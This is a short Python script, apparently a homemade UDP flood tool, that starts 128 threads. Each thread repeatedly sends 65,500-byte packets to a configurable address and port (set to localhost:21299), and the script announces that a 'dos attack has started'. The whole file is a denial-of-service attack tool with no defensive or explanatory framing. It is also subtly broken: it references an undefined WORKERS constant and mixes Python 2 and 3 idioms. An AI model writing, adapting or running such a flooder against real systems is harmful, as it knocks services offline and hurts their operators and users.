import socket
import time
import thread
import threading
udp_id_addr = "127.0.0.1"
udp_port_no = 21299
send_buff = "N" * 65500
send_delay = None
worker_count = 128
sock = None
lock = threading.Lock()
active_workers = 0
dos_inprog = 0

def add_wk():
	global active_workers
	lock.acquire()
	active_workers += 1
	lock.release()
	
def rm_rk():
	global active_workers
	lock.acquire()
	active_workers -= 1
	lock.release()

def worker(wk_id):
	global active_workers
	print("worker with the id of %d is now active.\n" % (wk_id))
	add_wk()
	try:
		while(dos_inprog):
			sock.sendto(send_buff, (udp_id_addr, udp_port_no))
			if (send_delay != None):
				time.sleep(send_delay)
	except Exception:
		print("theres seems of been an error.\n")
	rm_rk()
			
if __name__ == "__main__":
	dos_inprog = 1
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	for x in range(0, worker_count):
		try:
			thread.start_new_thread(worker, (x,))
		except:
			print ("Error: unable to start thread")
	print("dos attack has started with " + str(worker_count) + " workers.")
	print("waiting for all workers.")
	
	while(1):
		print(active_workers)
		if (active_workers == WORKERS): break
	print("all workers are avtive.")
	
	while(1):
		if (active_workers == 0): break
		cmd = input("")
		if (cmd == "stop"):
			dos_inprog = 0
			print("waiting for workers to shutdown.")
			while(active_workers != 0):
				None
			print("all workers have been shutdown.")
			break
